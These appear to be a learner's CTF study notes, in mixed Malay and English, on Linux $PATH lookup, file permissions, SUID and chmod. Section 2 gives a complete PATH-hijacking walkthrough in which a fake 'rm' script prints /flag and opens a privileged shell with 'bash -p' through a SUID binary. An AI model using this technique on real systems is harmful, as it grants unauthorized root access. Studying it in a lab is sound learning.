# `$PATH` Hijacking, SUID & File Permissions — Notes

## 1. `$PATH` & Camne Linux Cari Command
Commands like `ls`, `cat`, `rm` tu sebenarnya compiled binaries yang duduk dalam folders macam `/usr/bin/` atau `/bin/`.

* **`$PATH`**: List of folders (separated by `:`) yang bash search dari **kiri ke kanan** bila kita type bare command tanpa full path.
* Kalau guna full path (cth: `/usr/bin/rm`), Linux langsung ignore `$PATH`.

```bash
which ls                  # check lokasi sebenar binary ls
echo $PATH                # tengok isi $PATH sekarang

PATH=""                   # kosongkan $PATH (current shell je)
export PATH=""            # kosongkan $PATH termasuk child processes
PATH=~/bin:$PATH          # selit ~/bin kat depan $PATH tanpa buang yang lama
```
*(Jangan letak space dekat `=` masa set variable dalam bash!)*

---

## 2. PATH Hijacking Attack
Bila SUID program call command **tanpa full path** (cth: `rm` je, bukan `/usr/bin/rm`) dan tak sanitize `$PATH`, kita boleh trick dia run fake script kita instead.

### Attack Flow
1. Buat folder untuk fake command:
   ```bash
   mkdir -p ~/bin
   ```
2. Tulis fake script guna nama command yang sama (cth: `rm`):
   ```bash
   # -e enable escape sequences supaya \n jadi newline
   echo -e '#!/bin/bash\n/usr/bin/cat /flag\n/bin/bash -p' > ~/bin/rm
   ```
3. Bagi execute permission:
   ```bash
   chmod +x ~/bin/rm
   ```
4. Letak `~/bin` depan `$PATH` pastu run SUID program:
   ```bash
   PATH=~/bin:$PATH /challenge/run
   ```
   *(Child process inherit parent identity — `~/bin/rm` kita run dengan kuasa `root`!)*

---

## 3. Breakdown 7 Columns `ls -l`
```text
-rwsr-xr-x   1    root      root      16384 Nov 19 07:33 run
  (1)       (2)    (3)       (4)        (5)        (6)      (7)
```

| Column | Name | Maksud |
| :--- | :--- | :--- |
| **(1)** | Type & Permissions | Huruf 1 = jenis (`-` file, `d` dir, `l` symlink, `p` FIFO). Lepas tu 3 set `rwx` untuk Owner / Group / Others. |
| **(2)** | Hard Link Count | Berapa hard links yang point ke data ni. |
| **(3)** | Owner | Pemilik file — kuasa dia yang dipakai kalau SUID aktif. |
| **(4)** | Group | Group pemilik file. |
| **(5)** | Size | Saiz dalam bytes. |
| **(6)** | Timestamp | Tarikh last modified. |
| **(7)** | Filename | Nama file. |

---

## 4. SUID & `bash -p`
* **SUID (`-rwsr-xr-x`):** `s` gantikan `x` kat slot Owner. Normal user boleh run program guna kuasa owner asal (cth: `root`).
* **Kernel protection:** Kalau SUID file di-modify, kernel auto-drop bit `s`.
* **`bash -p`:** Default bash akan drop `root` privilege kalau real UID ≠ effective UID. Flag `-p` paksa bash kekalkan kuasa `root` — open root shell (`#`).

---

## 5. `chmod` — Change Permissions

### Permission Values
* `r` = `4`, `w` = `2`, `x` = `1`, `-` = `0`

### Symbolic Style
* `u` = Owner, `g` = Group, `o` = Others, `a` = All

```bash
chmod +x ~/bin/rm          # tambah execute untuk semua
chmod u=r,go= flag         # owner: read je; group & others: no access
chmod u=rw,go= flag        # owner: read+write; group & others: no access
```

### Octal Style (3 digits: Owner Group Others)
Tambah values untuk dapat digit — contoh: `rwx` = 4+2+1 = `7`

| Code | Breakdown | `ls -l` | Common Use |
| :--- | :--- | :--- | :--- |
| `755` | 7, 5, 5 | `-rwxr-xr-x` | Program yang semua orang boleh run |
| `700` | 7, 0, 0 | `-rwx------` | Private program, owner je |
| `644` | 6, 4, 4 | `-rw-r--r--` | Normal text file |
| `600` | 6, 0, 0 | `-rw-------` | Secret file, owner je |
| `400` | 4, 0, 0 | `-r--------` | Read-only, root je |

```bash
chmod 755 ~/bin/rm         # sama macam chmod +x
chmod 400 flag             # lock — root je boleh baca
```
